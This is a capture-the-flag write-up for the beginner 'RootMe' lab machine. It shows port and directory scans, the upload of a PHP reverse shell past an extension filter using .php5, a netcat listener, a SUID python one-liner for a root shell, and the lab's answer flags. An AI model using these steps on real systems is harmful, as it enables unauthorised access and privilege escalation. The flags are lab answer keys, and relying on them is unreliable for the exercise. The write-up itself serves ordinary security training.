# RootMe
A ctf for beginners, can you root me?

## Task 2  Reconnaissance


### Scan the machine, how many ports are open?

2

```
# Nmap 7.80 scan initiated Thu Jul  7 20:21:10 2022 as: nmap -sS -sC -sV -O -oA initialnmap -vv 10.10.129.84
Nmap scan report for 10.10.129.84
Host is up, received echo-reply ttl 63 (0.063s latency).
Scanned at 2022-07-07 20:21:12 IST for 174s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC4fnU3h1O9PseKBbB/6m5x8Bo3cwSPmnfmcWQAVN93J
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/7%OT=22%CT=1%CU=33319%PV=Y%DS=2%DC=I%G=Y%TM=62C732D6
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3
OS:=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F
OS:4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW
OS:6%CC=Y%Q=)ECN(R=N)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T1(R=N)T2(R=N)T
OS:3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T4(R=N)T5(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T5(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O
OS:=%RD=0%Q=)T6(R=N)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T7(R=N)U1
OS:(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)U1(R=N)IE(
OS:R=Y%DFI=N%T=40%CD=S)IE(R=N)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul  7 20:24:06 2022 -- 1 IP address (1 host up) scanned in 175.95 seconds
```


### What version of Apache is running?

2.4.29

```
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

### What service is running on port 22?

ssh

### What is the hidden directory?

/panel/

```
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.129.84/
[+] Threads      : 10
[+] Wordlist     : directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2022/07/07 20:24:00 Starting gobuster
=====================================================
/uploads (Status: 301)
/css (Status: 301)
/js (Status: 301)
/panel (Status: 301)
```

## Task 3  Getting a shell

### Find a form to upload and get a reverse shell, and find the flag.
user.txt

Downloaded 

https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

and set reverse shell listener

sudo nc -lvnp 443

Fiddling around with the blacklist filter on /panel was able to get a revershe shell using the extension .php5

```
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 19:47:26 up 30 min,  0 users,  load average: 0.12, 0.04, 0.20
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

Getting user txt

```
$ find / -type f -name user.txt 2>/dev/null
/var/www/user.txt
```

THM{y0u_g0t_a_sh3ll}

## Task 4  Privilege escalation

### Search for files with SUID permission, which file is weird?

/usr/bin/python 

```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

...
-rwsr-sr-x 1 root root 3665768 Aug  4  2020 /usr/bin/python
...

```

Spawn root shell

```
./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Getting root txt

```

find / -type f -name root.txt 2>/dev/null
/root/root.txt
cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

### root.txt
THM{pr1v1l3g3_3sc4l4t10n}
